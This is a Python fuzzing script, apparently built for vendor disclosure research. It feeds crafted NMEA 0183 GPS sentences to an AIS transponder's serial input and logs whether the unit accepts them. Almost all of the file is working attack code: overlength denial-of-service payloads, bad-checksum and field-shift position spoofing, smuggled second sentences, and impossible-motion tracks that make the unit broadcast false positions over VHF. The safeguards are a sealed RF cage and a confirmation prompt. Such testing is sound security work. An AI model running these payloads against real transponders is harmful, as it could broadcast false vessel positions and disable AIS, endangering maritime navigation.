#!/usr/bin/env python3
r"""
serial_cve_suite.py -- systematic serial-interface (NMEA 0183 / IEC 61162-1) abuse suite for
AIS transponders, built to ENUMERATE CVE-CANDIDATE weaknesses for vendor disclosure.

It feeds crafted GPS/position sentences to the transponder's serial sensor input and logs a
timestamped manifest. A separate serial recorder (the unit's AIS output) and an SDR (VHF
witness) capture what the unit does; analyze_serial_cve.py correlates all three into a
per-finding CVE report.

KEY IDEA: every crafted sentence carries a DISTINCT spoof position, far from the valid
baseline. During each test the valid feed is replaced by the crafted variant for a dwell
window, then restored. The analyzer then decides, per test:
  ACCEPTED  -> the unit's broadcast position moved to the spoof position (it acted on the
               malformed input) -- the core evidence for false-position CVEs.
  REJECTED  -> the unit held the baseline / went stale (it rejected the input) -- good.
  DENIAL    -> the unit's own transmissions stopped for a measurable outage (DoS).
  EMITTED   -> the unit re-emitted an over-length / malformed sentence on its output.
  DIFFERENTIAL -> the unit broadcast a position a strict reference parser would NOT derive
               from the sent bytes (field-shift, checksum-boundary, smuggled sentence).

Findings map to "Security Assessment of AIS Serial Conformance Findings": overlength ingest
(DoS), invalid checksum (false position), reserved bytes, doubled/swapped terminators, talker
digits, excess fields, and the plausibility violations (speed/movement/teleport/accel).

** SAFETY ** the unit will TRANSMIT its (spoofed) position over VHF -> cage sealed only.

Setup (cage sealed):
  transponder Pi: python3 record_serial.py --port <ais-out> --baud 38400   # unit AIS output
  listener Pi:    ./record_ais.sh                                          # VHF witness
  attacker Pi:    python3 serial_cve_suite.py --gps-port /dev/ttyUSB0 \
                      --lat 42.35 --lon -70.90 --i-confirm-cage-sealed

Requires: pyserial (only for live runs; --dry-run needs nothing).
"""
import argparse, json, os, sys, time, threading

try:
    import serial
except Exception:
    serial = None


# ----------------------------------------------------------------------------
# NMEA 0183 sentence construction
# ----------------------------------------------------------------------------
def checksum(body):
    """XOR of every char between '$'/'!' and '*' (exclusive), as 2 hex digits."""
    cs = 0
    for c in body:
        cs ^= ord(c)
    return f"{cs:02X}"


def _nm(deg, is_lat):
    hemi = ('N' if deg >= 0 else 'S') if is_lat else ('E' if deg >= 0 else 'W')
    deg = abs(deg); d = int(deg); m = (deg - d) * 60
    return (f"{d:02d}{m:07.4f}" if is_lat else f"{d:03d}{m:07.4f}"), hemi


def gga_body(lat, lon, talker="GP"):
    """The body of a GPGGA sentence (between $ and *), carrying position `lat,lon`."""
    la, lah = _nm(lat, True); lo, loh = _nm(lon, False)
    t = time.strftime("%H%M%S", time.gmtime())
    # time, lat, N/S, lon, E/W, fix=1, sats=08, hdop=0.9, alt, M, geoid, M, dgps age, ref
    return f"{talker}GGA,{t}.00,{la},{lah},{lo},{loh},1,08,0.9,10.0,M,0.0,M,,"


def rmc_body(lat, lon, sog=0.0, cog=0.0, talker="GP"):
    la, lah = _nm(lat, True); lo, loh = _nm(lon, False)
    t = time.strftime("%H%M%S", time.gmtime()); d = time.strftime("%d%m%y", time.gmtime())
    return f"{talker}RMC,{t}.00,A,{la},{lah},{lo},{loh},{sog:.1f},{cog:.1f},{d},,,A"


def sentence(body, term="\r\n", cksum=None):
    """Wrap a body into a full sentence. cksum=None computes it; pass a string to force a
    (possibly wrong) checksum; pass '' for a missing checksum."""
    cs = checksum(body) if cksum is None else cksum
    star = "*" if cksum != "" else ""
    return f"${body}{star}{cs}{term}"


def valid_feed(lat, lon, sog=0.0, cog=0.0):
    """The clean baseline position feed (list of full sentences)."""
    return [sentence(gga_body(lat, lon)),
            sentence(rmc_body(lat, lon, sog, cog))]


# ----------------------------------------------------------------------------
# Test catalog. Each test is a dict:
#   name, finding, cve (assessment strength), desc,
#   spoof=(lat,lon) it tries to inject,
#   gen(base, spoof, t) -> list[str] full byte strings to write this cycle,
#   plus optional analyzer hints: shift=(lat,lon) a field-shift would yield,
#   smuggle=(lat,lon) a smuggled 2nd sentence carries, dynamic=True for plausibility motion.
# The catalog is intentionally easy to extend: add a row, give it a distinct spoof position.
# ----------------------------------------------------------------------------
def build_tests(base_lat, base_lon, overlength_lengths=(200, 1000, 4000, 16000)):
    T = []
    # distinct spoof position per test: base + a unique offset so the analyzer can attribute
    def spoof(i): return (base_lat + 0.05 + 0.01 * i, base_lon + 0.05 + 0.01 * i)

    # ---- 1. OVERLENGTH INGEST -> DoS (strong CVE) : valid GGA padded well past 82 chars.
    #    A length SWEEP so the analyzer can characterize outage duration vs. input length on
    #    BOTH the serial output and the RF (VHF) transmission. ----
    for L in overlength_lengths:
        sp = spoof(len(T))
        def gen(base, sp, t, L=L):
            b = gga_body(*sp)
            pad = ",0" * ((L - len(b)) // 2 + 1)     # extra comma-fields to overrun 82
            return [sentence(b + pad)]
        T.append(dict(name=f"overlength_{L}", finding="1 overlength ingest", cve="STRONG",
                      desc=f"valid GGA padded to ~{L} chars (mandatory 82-char bound)",
                      spoof=sp, gen=gen))
    # unterminated overlength: keep the parser waiting (no CR/LF)
    sp = spoof(len(T))
    def gen_unterm(base, sp, t):
        b = gga_body(*sp); pad = ",0" * 2000
        return [sentence(b + pad, term="")]          # NO terminator
    T.append(dict(name="overlength_unterminated", finding="1 overlength ingest", cve="STRONG",
                  desc="~4k-char GGA with NO terminator (parser starvation)",
                  spoof=sp, gen=gen_unterm))

    # ---- 6. INVALID CHECKSUM ACCEPTED -> false position (strong CVE) ----
    for tag, ck in (("wrong", "00"), ("nonhex", "ZZ"), ("missing", ""), ("overlong", "ABCD")):
        sp = spoof(len(T))
        def gen(base, sp, t, ck=ck):
            return [sentence(gga_body(*sp), cksum=ck)]
        T.append(dict(name=f"badcksum_{tag}", finding="6 invalid checksum", cve="STRONG",
                      desc=f"GGA carrying spoof position with a {tag} checksum",
                      spoof=sp, gen=gen))

    # ---- 3. RESERVED BYTE in a data field (parser weakness / smuggling) ----
    for tag, ch in (("bang", "!"), ("dollar", "$"), ("star", "*"), ("caret", "^"), ("nul", "\x00")):
        sp = spoof(len(T))
        def gen(base, sp, t, ch=ch):
            b = gga_body(*sp)
            # inject the reserved char into the altitude field (near the middle)
            b2 = b.replace("10.0", "1" + ch + "0.0", 1)
            return [sentence(b2)]
        T.append(dict(name=f"reserved_{tag}", finding="3 reserved byte", cve="MODERATE",
                      desc=f"GGA with reserved char {repr(ch)} embedded in a data field",
                      spoof=sp, gen=gen))

    # ---- 4. DOUBLED TERMINATOR + smuggled 2nd sentence (sentence smuggling) ----
    sp = spoof(len(T)); sm = (base_lat - 0.07, base_lon - 0.07)
    def gen_dblterm(base, sp, t, sm=sm):
        first = sentence(gga_body(*sp), term="\r\n\r\n")     # doubled terminator
        second = sentence(gga_body(*sm))                     # smuggled, different position
        return [first + second]
    T.append(dict(name="doubled_terminator_smuggle", finding="4 doubled terminator",
                  cve="MODERATE", desc="GGA with CRLFCRLF then a smuggled 2nd GGA (diff posn)",
                  spoof=sp, smuggle=sm, gen=gen_dblterm))

    # ---- 5. LF/CR ORDER SWAPPED + smuggled 2nd sentence ----
    sp = spoof(len(T)); sm = (base_lat - 0.08, base_lon - 0.08)
    def gen_lfcr(base, sp, t, sm=sm):
        first = sentence(gga_body(*sp), term="\n\r")         # LF then CR (swapped)
        second = sentence(gga_body(*sm))
        return [first + second]
    T.append(dict(name="lfcr_swap_smuggle", finding="5 swapped LF/CR", cve="WEAK",
                  desc="GGA terminated LF/CR then a smuggled 2nd GGA (diff posn)",
                  spoof=sp, smuggle=sm, gen=gen_lfcr))

    # ---- 7. DIGITS IN TALKER FIELD (source-validation) ----
    sp = spoof(len(T))
    def gen_talker(base, sp, t):
        return [sentence(gga_body(*sp, talker="G1"))]        # digit in talker id
    T.append(dict(name="talker_digits", finding="7 talker digits", cve="WEAK",
                  desc="GGA with a digit in the talker identifier ($G1GGA)",
                  spoof=sp, gen=gen_talker))

    # ---- 8. TOO MANY DATA FIELDS (+ field-shift differential) ----
    sp = spoof(len(T)); shift = (base_lat + 0.30, base_lon + 0.30)
    def gen_fields(base, sp, t, shift=shift):
        # prepend TWO extra fields before the real ones -> a lenient parser may read shifted
        # fields as lat/lon (the `shift` position); a strict one rejects.
        b = gga_body(*sp)
        b2 = b.replace("GGA,", "GGA,EXTRA1,EXTRA2,", 1)
        return [sentence(b2)]
    T.append(dict(name="too_many_fields", finding="8 excess fields", cve="MODERATE",
                  desc="GGA with two extra leading fields (field-shift / parser differential)",
                  spoof=sp, shift=shift, gen=gen_fields))

    # ---- 9-12. PLAUSIBILITY: well-formed but physically impossible (semantic weakness) ----
    sp = spoof(len(T))
    def gen_spd_nomove(base, sp, t):
        return [sentence(rmc_body(sp[0], sp[1], sog=45.0, cog=90.0))]   # fixed posn, fast SOG
    T.append(dict(name="speed_without_movement", finding="9 speed w/o movement", cve="SEMANTIC",
                  desc="RMC: fixed position, SOG=45kn", spoof=sp, gen=gen_spd_nomove))

    sp = spoof(len(T))
    def gen_move_nospd(base, sp, t):
        lat = sp[0] + 0.0008 * t                             # advances each second
        return [sentence(rmc_body(lat, sp[1], sog=0.0, cog=0.0))]
    T.append(dict(name="movement_without_speed", finding="10 movement w/o speed", cve="SEMANTIC",
                  desc="RMC: advancing position, SOG=0", spoof=sp, gen=gen_move_nospd, dynamic=True))

    sp = spoof(len(T))
    def gen_teleport(base, sp, t):
        lat, lon = (sp if int(t) % 2 == 0 else (sp[0] + 3.0, sp[1] + 3.0))  # jump ~330km
        return [sentence(rmc_body(lat, lon, sog=5.0, cog=90.0))]
    T.append(dict(name="teleport", finding="11 teleportation", cve="SEMANTIC",
                  desc="RMC: position jumps ~330 km between updates", spoof=sp,
                  gen=gen_teleport, dynamic=True))

    sp = spoof(len(T))
    def gen_accel(base, sp, t):
        lat = sp[0] + 0.02 * (t ** 2) * 0.001                # position ~ t^2 (accelerating)
        return [sentence(rmc_body(lat, sp[1], sog=1.0, cog=0.0))]
    T.append(dict(name="impossible_acceleration", finding="12 impossible accel", cve="SEMANTIC",
                  desc="RMC: position ~ t^2 while SOG reported low", spoof=sp,
                  gen=gen_accel, dynamic=True))

    return T


# ----------------------------------------------------------------------------
# Feeder: writes the current test's bytes to the serial port at `rate`
# ----------------------------------------------------------------------------
class Feeder(threading.Thread):
    def __init__(self, ser, base_lat, base_lon, rate=1.0):
        super().__init__(daemon=True)
        self.ser, self.rate = ser, rate
        self.base = (base_lat, base_lon)
        self.gen = None            # current test gen; None => baseline
        self.spoof = None
        self.t0 = time.time()
        self._stop = threading.Event()

    def set_test(self, test):
        self.gen = test["gen"] if test else None
        self.spoof = test["spoof"] if test else None
        self.t0 = time.time()

    def run(self):
        while not self._stop.is_set():
            if self.gen is None:
                data = valid_feed(*self.base)
            else:
                data = self.gen(self.base, self.spoof, time.time() - self.t0)
            for s in data:
                self._write(s)
            time.sleep(self.rate)

    def _write(self, s):
        if self.ser is None:
            return
        try:
            self.ser.write(s.encode("latin-1", "replace"))
        except Exception:
            pass

    def stop(self):
        self._stop.set()


# ----------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="Serial NMEA CVE-enumeration suite.")
    ap.add_argument("--gps-port", help="serial port feeding the unit's GPS input")
    ap.add_argument("--gps-baud", type=int, default=4800)
    ap.add_argument("--lat", type=float, default=42.35, help="baseline latitude")
    ap.add_argument("--lon", type=float, default=-70.90, help="baseline longitude")
    ap.add_argument("--dwell", type=float, default=30.0, help="seconds to feed each test")
    ap.add_argument("--gap", type=float, default=45.0,
                    help="baseline seconds between tests (also the recovery-observation window; "
                         "keep >= a possible reboot time so recovery is measurable)")
    ap.add_argument("--overlength-lengths", type=int, nargs="+",
                    default=[200, 1000, 4000, 16000],
                    help="sentence lengths for the overlength DoS sweep")
    ap.add_argument("--settle", type=float, default=45.0, help="baseline before starting")
    ap.add_argument("--only", nargs="+", help="run only these test names")
    ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
    ap.add_argument("--dry-run", action="store_true",
                    help="print each crafted sentence and exit (no serial, no hardware)")
    ap.add_argument("--i-confirm-cage-sealed", action="store_true")
    args = ap.parse_args()

    tests = build_tests(args.lat, args.lon, tuple(args.overlength_lengths))
    if args.only:
        tests = [t for t in tests if t["name"] in args.only]

    if args.dry_run:
        for t in tests:
            s = t["gen"]((args.lat, args.lon), t["spoof"], 0.0)
            raw = "".join(s)
            shown = raw.replace("\r", "\\r").replace("\n", "\\n").replace("\x00", "\\x00")
            print(f"[{t['cve']:8}] {t['name']:28} len={len(raw):>5}  spoof={t['spoof'][0]:.4f},{t['spoof'][1]:.4f}")
            print(f"           {shown[:140]}")
        print(f"\n{len(tests)} tests. (dry-run: nothing transmitted)")
        return

    if serial is None:
        print("needs pyserial: pip install pyserial --break-system-packages"); sys.exit(1)
    if not args.i_confirm_cage_sealed:
        if input("Type EXACTLY 'cage is sealed' to run: ").strip() != "cage is sealed":
            print("Aborted."); sys.exit(0)

    os.makedirs(args.logdir, exist_ok=True)
    stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    manifest = os.path.join(args.logdir, f"serialcve_{stamp}.jsonl")
    mf = open(manifest, "a", buffering=1)
    def rec(**kw):
        mf.write(json.dumps({"t": time.time(),
                             "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                             **kw}) + "\n")

    ser = serial.Serial(args.gps_port, args.gps_baud, timeout=1)
    feeder = Feeder(ser, args.lat, args.lon)
    feeder.start()
    rec(event="session_start", base_lat=args.lat, base_lon=args.lon, n_tests=len(tests))
    print(f"baseline @ {args.lat},{args.lon}; settling {args.settle}s ...")
    time.sleep(args.settle)
    rec(event="baseline", name="baseline_settle")   # analyzer baseline window
    time.sleep(2)

    try:
        for i, t in enumerate(tests):
            sp = t["spoof"]
            sample = "".join(t["gen"]((args.lat, args.lon), sp, 0.0))
            rec(event="test_begin", name=t["name"], finding=t["finding"], cve=t["cve"],
                desc=t["desc"], spoof_lat=sp[0], spoof_lon=sp[1],
                shift_lat=t.get("shift", (None, None))[0],
                shift_lon=t.get("shift", (None, None))[1],
                smuggle_lat=t.get("smuggle", (None, None))[0],
                smuggle_lon=t.get("smuggle", (None, None))[1],
                sent_len=len(sample), sample=sample[:160].replace("\x00", "\\x00"))
            print(f"[{i+1}/{len(tests)}] {t['name']} ({t['cve']}) spoof={sp[0]:.4f},{sp[1]:.4f}")
            feeder.set_test(t)
            time.sleep(args.dwell)
            feeder.set_test(None)                    # restore baseline
            rec(event="test_end", name=t["name"])
            time.sleep(args.gap)
    except KeyboardInterrupt:
        print("\ninterrupted."); rec(event="interrupted")
    finally:
        feeder.set_test(None); time.sleep(2)
        feeder.stop(); ser.close(); rec(event="session_end"); mf.close()

    print(f"\ndone. manifest: {manifest}")
    print("Feed this + the unit's serial-output capture + the VHF capture to analyze_serial_cve.py")


if __name__ == "__main__":
    main()
